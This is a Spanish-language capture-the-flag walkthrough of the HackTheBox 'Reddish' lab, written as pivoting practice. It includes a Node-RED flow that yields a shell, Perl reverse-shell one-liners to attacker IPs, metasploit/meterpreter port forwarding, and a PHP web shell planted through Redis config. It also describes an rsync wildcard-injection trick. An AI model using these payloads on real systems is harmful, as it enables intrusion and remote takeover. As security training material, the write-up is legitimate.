---
layout: post
title:  "[eCPPT Style] - Pivoting Reddish"
date:   2021-10-19 09:29:20 +0700
categories: jekyll update
---
<figure>
<img src="/assets/img/reddishlogo.png" alt="reddishlogo">
</figure>

Este walkthrough muestra el paso a paso para explotar un laboratorio de hackthebox (Reddish), utilizado como entrenamiento para preparar el examen de OSCP o eCPTT especificamente para el skill de pivoting.

Conectar VPN de Hackthebox `sudo openvpn 5pok.ovpn` y realizar un ping a la maquina vulnerable `ping -c 1 10.10.10.94`


# Recon 
### Nmap
Utilizar [nmap][nmap] para empezar la fase de recon.

{% highlight bash %}
nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.94

Nmap scan report for 10.10.10.94
Host is up (0.023s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
1880/tcp open  vsat-control

# Nmap done at Sat Jul 21 17:28:24 2018 -- 1 IP address (1 host up) scanned in 11.21 seconds

nmap -p 1880 -sC -sV -oA nmap/port1880 10.10.10.94

Nmap scan report for 10.10.10.94
Host is up (0.018s latency).

PORT     STATE SERVICE VERSION
1880/tcp open  http    Node.js Express framework
|_http-title: Error

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 21 17:37:09 2018 -- 1 IP address (1 host up) scanned in 12.71 seconds
{% endhighlight %}  

### NodeRed - p:1880

Solo tenemos un puerto abierto. Así que lo abri en el browser, me mostro un error de método GET.

<figure>
<img src="/assets/img/1.png" alt="1">
</figure>

Capture la request con burp suite y cambié la solicitud a POST y obtuve una respuesta. Contiene un ID y un path. Podemos acceder a esa ruta solo con un ID. Es un servicio [Node-RED][nodered]

<figure>
<img src="/assets/img/2.png" alt="2">
</figure>

# Code Execution / Shell in Node-Red

Deberia quedar un flujo asi:

<figure>
<img src="/assets/img/3.png" alt="3">
</figure>

Tambien existe otra forma, importando el siguiente codigo (modificando el host 10.10.X.X)


{% highlight json %}
[
  { "id": "7235b2e6.4cdb9c", "type": "tab", "label": "Flow 1" },
  {
    "id": "d03f1ac0.886c28",
    "type": "tcp out",
    "z": "7235b2e6.4cdb9c",
    "host": "",
    "port": "",
    "beserver": "reply",
    "base64": false,
    "end": false,
    "name": "",
    "x": 786,
    "y": 350,
    "wires": []
  },
  {
    "id": "c14a4b00.271d28",
    "type": "tcp in",
    "z": "7235b2e6.4cdb9c",
    "name": "",
    "server": "client",
    "host": "10.10.XX.XX",
    "port": "3488",
    "datamode": "stream",
    "datatype": "buffer",
    "newline": "",
    "topic": "",
    "base64": false,
    "x": 281,
    "y": 337,
    "wires": [["4750d7cd.3c6e88"]]
  },
  {
    "id": "4750d7cd.3c6e88",
    "type": "exec",
    "z": "7235b2e6.4cdb9c",
    "command": "",
    "addpay": true,
    "append": "",
    "useSpawn": "false",
    "timer": "",
    "oldrc": false,
    "name": "",
    "x": 517,
    "y": 362.5,
    "wires": [["d03f1ac0.886c28"], ["d03f1ac0.886c28"], ["d03f1ac0.886c28"]]
  }
]
{% endhighlight %}  

{% highlight bash %}
root@kali# nc -lnvp 3488
listening on [any] 3488 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.94] 51766
> id
uid=0(root) gid=0(root) groups=0(root)

> pwd
/node-red

> ls /home
node

> ls /home/node
{% endhighlight %}

Luego abrir una reverse shell con perl, ya que la maquina virtual no posee python, nc, etc

{% highlight perl %}
perl -e 'use Socket;$i="10.10.14.30";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
{% endhighlight %}

<figure>
<img src="/assets/img/4.png" alt="4">
</figure>

# NODERED -> CONTAINER TWO (AKA WWW)
### Local Enumeration

{% highlight bash %}
# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
9: eth1@if10: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:13:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.19.0.3/16 brd 172.19.255.255 scope global eth1
       valid_lft forever preferred_lft forever
11: eth0@if12: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
{% endhighlight %}

Podemos ver que estamos dentro de un contenedor.

<figure>
<img src="/assets/img/5.png" alt="5">
</figure>

### Network Enumeration

Utilizaremos un one liner para ver los host que estan activos dentro de la red.

{% highlight bash %}
# for i in $(seq 1 20); do (ping -c 1 172.18.0.$i | grep "bytes from"); done
64 bytes from 172.18.0.1: icmp_seq=1 ttl=64 time=0.065 ms
64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.032 ms
# for i in $(seq 1 20); do (ping -c 1 172.19.0.$i | grep "bytes from"); done
64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.106 ms
64 bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.088 ms
64 bytes from 172.19.0.3: icmp_seq=1 ttl=64 time=0.170 ms
64 bytes from 172.19.0.4: icmp_seq=1 ttl=64 time=0.022 ms
{% endhighlight %}

Ahora tenemos dos nuevos host

<figure>
<img src="/assets/img/6.png" alt="6">
</figure>

Port scan en bash

{% highlight bash %}
# bash -c 'for p in $(seq 1 10000); do(echo test >/dev/tcp/172.19.0.2/$p && echo "$p open") 2>/dev/null; done'
6379 open
# bash -c 'for p in $(seq 1 10000); do(echo test >/dev/tcp/172.19.0.4/$p && echo "$p open") 2>/dev/null; done'
80 open
{% endhighlight %}

# Pivoting 
### Port Forwarding

Utilizaremos meterpreter para ganar una session desde nodered. Para esto tenemos que abrir un handler con un payload `linux/x64/shell/reverse_tcp`

{% highlight bash %}
msf exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x64/shell/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.14      yes       The listen address (an interface may be specified)
   LPORT  9002             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.14:9002 
[*] Sending stage (38 bytes) to 10.10.10.94
[*] Command shell session 1 opened (10.10.14.14:9002 -> 10.10.10.94:44602) at 2018-07-27 06:33:58 -0400

/bin/sh: 0: can't access tty; job control turned off
{% endhighlight %}

{% highlight bash %}
# id
/bin/sh: 1: j^H��j!Xu�j: not found
/bin/sh: 1: X�H�/bin/shSH��RWH��id: not found
# id
uid=0(root) gid=0(root) groups=0(root)
# ^Z
Background session 1? [y/N]  y
msf exploit(multi/handler) >
{% endhighlight %}

{% highlight bash %}
msf exploit(multi/handler) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.14.14:4433 
[*] Sending stage (861480 bytes) to 10.10.10.94
[*] Meterpreter session 2 opened (10.10.14.14:4433 -> 10.10.10.94:58956) at 2018-07-27 06:37:15 -0400
[*] Command stager progress: 100.00% (773/773 bytes)
msf exploit(multi/handler) > sessions -i 2
[*] Starting interaction with 2...

meterpreter >
{% endhighlight %}

### Agregando Forwards

Ahora podemos agregar forwards a la session: `meterpreter > portfwd add -l 80 -r 172.19.0.4 -p 80`
Eso agregará un tunel del p:80 en mi máquina local al p:80 en 172.19.0.4.

# www / redis Containers
### Web Site p:80

Visitar http://127.0.0.1/

<figure>
<img src="/assets/img/7.png" alt="7">
</figure>

### View source code

Ver el codigo fuente del index

<figure>
<img src="/assets/img/red_8.png" alt="8">
</figure>

Podemos ver que hay una funcion interesante. Pero al probar LFI nos tira un error, debe ser una rabbit hole.

<figure>
<img src="/assets/img/red_9.png" alt="9">
</figure>

Probemos agregando un fwd a la ip 172.19.0.2 p:6379  `meterpreter > portfwd add -l 6379 -r 172.19.0.2 -p 6379`

Ahora podemos mandar un nmap para obtener mayor informacion del p:6379

{% highlight bash %}
root@kali# nmap -A -p6379 127.0.0.1
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-19 03:51 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000049s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.9
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.32
OS details: Linux 2.6.32
Network Distance: 0 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.20 seconds
{% endhighlight %}

Se puede visualizar que se esta alojando un servicio [Redis][redis2]

{% highlight bash %}
root@kali# sudo redis-cli -h 127.0.0.1
127.0.0.1:6379> info
.
.
.
.
.
.
# Replication
role:slave
{% endhighlight %}

Actualmente tenemos el rol de "slave", elevaremos privilegios a "master"

{% highlight bash %}
root@kali# slaveof no one
OK
(0.55s)
127.0.0.1:6379> info
.
.
.
.
.
.
# Replication
role:master
{% endhighlight %}

Segun [hacktrickz][redis1], podemos subir una shell .php utilizando el directorio obtenido desde el codigo fuente, de la siguiente forma:

{% highlight bash %}
root@kali# (echo -e "\n\n"; cat shell.php; echo -e "\n\n") > spok.php
root@kali# cat spok.php 

<?php system($_REQUEST['spok']); ?>

root@kali# redis-cli -h 127.0.0.1 flushall
OK
root@kali# cat spok.php | redis-cli -h 127.0.0.1 -x set crackit
OK
root@kali# redis-cli -h 127.0.0.1
127.0.0.1:6379> config set dir /var/www/html/8924d0549008565c554f8128cd11fda4/
OK
(0.56s)
127.0.0.1:6379> config get dir
1) "dir"
2) "/var/www/html/8924d0549008565c554f8128cd11fda4"
(0.55s)
127.0.0.1:6379> config set dbfilename "spok.php"
OK
(0.56s)
127.0.0.1:6379> save
OK
(0.55s)
127.0.0.1:6379>
{% endhighlight %}

Podemos ver que obtuvimos RCE de la siguiente manera: 
{% highlight bash %}
http://127.0.0.1/8924d0549008565c554f8128cd11fda4/spok.php?spok=whoami
{% endhighlight %}

Para obtener una rev-shell, tenemos que utilizar perl: 
{% highlight bash %}
http://127.0.0.1/8924d0549008565c554f8128cd11fda4/spok.php?spok=perl%20-e%20%27use%20Socket%3b$i%3d%22172.19.0.3%22%3b$p%3d9000%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname(%22tcp%22))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,%22%3E%26S%22)%3bopen(STDOUT,%22%3E%26S%22)%3bopen(STDERR,%22%3E%26S%22)%3bexec(%22/bin/sh+-i%22)%3b}%3b%27
{% endhighlight %}

Con netcat obtenemos una shell en el nuevo contenedor

{% highlight bash %}
# nc -lnvp 9000
Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )
Ncat: Listening on :::9000
Ncat: Listening on 0.0.0.0:9000
Ncat: Connection from 172.19.0.4.
Ncat: Connection from 172.19.0.4:41462.
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$
{% endhighlight %}

# TO CONTAINER THREE (AKA BACKUP)

Despues de analizar el contenedor, en el directorio backup tenemos un file .sh

{% highlight bash %}
$ cat /backup/backup.sh
cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
rsync -a *.rdb rsync://backup:873/src/rdb/
cd / && rm -rf /var/www/html/*
rsync -a rsync://backup:873/src/backup/ /var/www/html/
chown www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
{% endhighlight %}

Se puede visualizar que se esta respaldando la base de datos con rsync, luego eliminando las carpetas www y devolviéndolas desde un host llamado backup.

Puedo explotar el comando "rsync -a * .rdb rsync: // backup: 873 / src / rdb", específicamente el carácter *. Debido a la forma que unix maneja los *, se puede crear un archivo llamado -e sh p.rdb, y eso ejecutara sh p.rdb. [La técnica se detalla aquí][unixwildcard].










[nmap]: https://github.com/nmap/nmap
[nodered]: https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/
[redis2]:https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html
[redis1]:https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
[unixwildcard]:https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt

